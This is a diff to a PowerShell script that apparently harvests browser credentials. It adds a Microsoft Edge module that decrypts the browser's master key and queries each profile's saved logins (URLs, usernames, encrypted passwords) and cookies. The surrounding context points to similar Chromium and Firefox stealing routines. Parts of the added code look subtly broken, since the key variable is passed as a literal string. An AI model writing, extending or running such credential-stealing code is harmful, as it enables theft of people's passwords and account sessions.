@@ -761,6 +761,43 @@ foreach ($chromiumPath in $chromiumPaths) {
 
 }
 
+# Edge
+# "$($env:HOMEDRIVE)\$($env:HOMEPATH)\AppData\Local\Microsoft\Edge\User Data\Default"
+$edge = @("Edge")
+$chromiumPaths = @()
+foreach($_item in $edge) {
+    $chromiumPaths += "$env:LocalAppData\Microsoft\$_item"
+}
+foreach ($chromiumPath in $chromiumPaths) {
+    if ( -not (Test-Path -Path "$chromiumPath") ) {
+        continue
+    }
+    $data[$_item] = @{}
+    try{
+        # Read local state data
+        $data[$_item]['decrypted_key'] = Read-ChromiumLocalState -path "$chromiumPath\User Data\Local State"
+    }catch{}
+
+    # Read dir
+    $folders = Get-ChildItem -Name -Directory "$chromiumPath\User Data"
+    foreach ($_folder in $folders) {
+        $folder = $_folder.ToLower()
+        if (-not ($folder -eq "default" -or $folder.StartsWith("profile "))) {
+            continue
+        }
+        $data[$_item][$_folder] = [ordered]@{}
+        try {
+            # Read logins data
+            $data[$_item][$_folder]['logins'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Login Data" -query 'select origin_url,username_value,hex(password_value) from logins'
+        }catch{}
+        try {
+            # Read cookies data
+            $data[$_item][$_folder]['cookies'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Cookies" -query 'select host_key,name,hex(encrypted_value) from cookies'
+        }catch{}
+    }
+
+}
+
 # Firefox decryptor
 try {
     # Load nss3.dll
